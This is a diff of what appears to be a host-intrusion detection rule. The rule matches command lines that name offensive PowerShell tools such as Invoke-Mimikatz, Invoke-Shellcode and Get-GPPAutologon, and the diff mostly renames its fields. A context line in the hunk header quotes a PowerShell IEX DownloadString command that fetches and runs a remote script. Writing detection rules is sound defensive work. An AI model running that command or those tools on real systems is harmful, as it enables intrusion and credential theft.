@@ -340,9 +340,9 @@ powershell IEX (New-Object System.Net.Webclient).DownloadString(\"http://172.16.
 ```bash
 
 state:     enable
-rule_id :  Hacker-Command-Line-01
-rule_tag:  Hacker-Command-Line-events
-rule_name: Hacker-Command-Line
+rule_id :  hacker-command-line-01
+rule_tag:  hacker-command-line
+rule_name: hacker-command-line-01
 rule_type: or  
 
 detect_list:
@@ -350,11 +350,11 @@ detect_list:
   - field : command_line
     type: re
     rule: (Get-GPPAutologon|Get-TimedScreenshot|Invoke-DllInjection|Invoke-Shellcode|Invoke-WmiCommand|Get-System|Invoke-Mimikatz|Invoke-NinjaCopy|Out-Minidump)
-    ignorecase: True
+    ignorecase: true
 
 threat_level : high
 auth : njcx
-info": "Hacking Command Line events"
+info: hacker command tools
 
 e-mail:
     - njcx@qq.com
